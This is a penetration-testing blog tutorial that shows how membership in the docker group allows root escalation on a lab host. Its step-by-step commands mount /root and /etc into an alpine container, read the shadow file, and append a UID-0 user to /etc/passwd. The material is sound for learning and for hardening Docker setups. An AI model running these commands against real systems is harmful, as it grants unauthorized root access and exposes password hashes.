<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/container-security/" rel="category tag">Container Security</a>, <a href="https://www.hackingarticles.in/category/container-security/docker-pentest/" rel="category tag">Docker Pentest</a>, <a href="https://www.hackingarticles.in/category/privilege-escalation/" rel="category tag">Privilege Escalation</a></span>            </div>
            <h1 class="post-title entry-title">Docker Privilege Escalation</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/docker-privilege-escalation/" rel="bookmark"><time class="entry-date published" datetime="2019-11-20T09:23:40+00:00">November 20, 2019</time><time class="updated" datetime="2025-05-16T16:46:01+00:00">May 16, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">In our previous article we have discussed ‚Äú<strong><span style="color: #0000ff;"><a style="color: #0000ff;" href="https://www.hackingarticles.in/docker-installation-configuration/">Docker Installation &amp; Configuration</a></span></strong>‚Äùbut today you will learn how to escalate the root shell if docker is running on the hots machine or I should say docker privilege escalation to spawn root shell.</span></p>
<p><span style="color: #000000;">While we know that there is an issue with the docker that all the commands in docker require sudo as docker needs root to run. The Docker daemon works in such a way that it is allowed access to the root user or any other user in the particular docker group. This shows that access to the docker group is the same as to give constant root access without any password. üßê</span></p>
<h3><span style="color: #000000;"><span style="color: #800000;">Quick Lab setup</span> </span></h3>
<p><span style="color: #000000;">Execute the below command to install docker in your localhost machine. I have used ubutnu 18.04 here as target machine.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">apt install docker.io</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-5TEdAsThPiQ/XdUESuEM7VI/AAAAAAAAhYM/F45cuba3Dgc14tScrQGjfqG2TLvCTZ__gCLcBGAsYHQ/s1600/1.png"/></span></p>
<p><span style="color: #000000;">Create a local user, say Ignite is the username with least privileges add new group ‚Äúdocker‚Äù for ‚Äúignite‚Äù.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">adduser ignite
usermod -G docker ignite
newgrp docker</pre>
<p><span style="color: #000000;"><img fetchpriority="high" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-Ek-D2PRx_C0/XdUESwxs_vI/AAAAAAAAhYQ/Tc660edRENEbwbE2ICzfCV2Jxx5g3CJEQCLcBGAsYHQ/s1600/3.png" alt="Docker Privilege Escalation" width="692" height="391"/></span></p>
<p><span style="color: #000000;">To proceed for privilege escalation, you should have local access of the host machine, therefore here we choose ssh to access the machine as ignite who is a local user on this machine.¬†</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ssh ignite@192.168.1.6
id</pre>
<p><span style="color: #000000;">Since we have access to the user which is a part of the docker group and said above if the user is part of the docker group then it is the same as to give constant root access without any password. üòà</span></p>
<h3 data-pm-slice="1 1 []"><span style="color: #800000;">Mounting the Root Filesystem</span></h3>
<p><span style="color: #000000;">We ran the command shown below, this command obtains the alpine image from the Docker Hub Registry and runs it. The <strong>‚Äìv </strong>parameter specifies that we want to create a volume in the Docker instance. The <strong>‚Äìit</strong> parameters put the Docker into the shell mode rather than starting a daemon process. The instance is set up to mount the root filesystem of the target machine to the instance volume. So when the instance starts it immediately loads a chroot into that volume. This gives us the root of the machine. After running the command, we traverse into the /mnt directory and found out flag.txt.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">docker run -v /root:/mnt -it alpine</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-N4PU8gkmdjY/XdUETSSjUtI/AAAAAAAAhYU/-Z7A--KxbmYKHjVq9uQ4EUPK1WEXur30QCLcBGAsYHQ/s1600/4.png"/></span></p>
<p><span style="color: #000000;">Similarly, an intruder can mount other system files to escalate the privilege for the local user such as he can mount the passwd or shadow or ssh-key.</span></p>
<p><span style="color: #000000;">As you can see here, we try to mount/etc directory to obtain shadow file. Similarly, one can access passwd file and add his own privilege user. ü§î</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">docker run -v /etc/:/mnt -it alpine
cd /mnt
cat shadow</pre>
<p><span style="color: #000000;"><img decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-gHcjfrS9lGM/XdUETp0D-gI/AAAAAAAAhYY/4yf8TfHeYmUcxY_CrRXfyoAG6WAIqwdhwCLcBGAsYHQ/s1600/5.png" alt="Docker Privilege Escalation" width="721" height="850"/></span></p>
<p><span style="color: #000000;">So, if you have access shadow file then you can try to crack passwd hashes. If you have access passwd file you can add you own privilege user by generating password salt as shown here.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">openssl passwd -1 -salt raj</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-HEnODH2_O18/XdUETz3b5OI/AAAAAAAAhYc/9r9ioFKsYgIOlNreCm_5oyNWv0ooSjbjwCLcBGAsYHQ/s1600/6.png"/></span></p>
<h3 data-pm-slice="1 1 []"><span style="color: #800000;">Modifying the passwd File for Root Access</span></h3>
<p><span style="color: #000000;">Now a new record inside the passwd file for your user.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">docker run -v /etc/:/mnt -it alpine
cd /mnt
echo 'raj:saltpasswd:0:0::/root:/bin/bash' &gt;&gt;passwd
tail passwd</pre>
<p><span style="color: #000000;">From the given below image you can observe that now we have user raj as member of root. Thus, we switch to as raj and access the root shell.</span></p>
<p><span style="color: #000000;">Thus, in this way we can escalated the permission of a host machine, hope you will enjoy this little and powerful post. üòä</span></p>
<p><span style="color: #000000;"><img decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-84SrOuTtwYY/XdUEUAhkA_I/AAAAAAAAhYg/-3QoWWavV7sqs5rKbB1BxrKv5eOBZJHUQCLcBGAsYHQ/s1600/7.png" alt="Docker Privilege Escalation" width="775" height="359"/></span></p>
<p><span style="color: #000000;">To Learn more about Container Security. Follow this <strong><a href="https://www.hackingarticles.in/category/container-security/">Link.</a></strong></span></p>
<p><span style="color: #000000;"><strong>Author</strong>: Kavish Tyagi is a Cybersecurity enthusiast and Researcher in the field of WebApp Penetration testing. Contact</span>¬†<a href="https://www.linkedin.com/in/kavish-tyagi-844239125/"><strong>here</strong></a></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
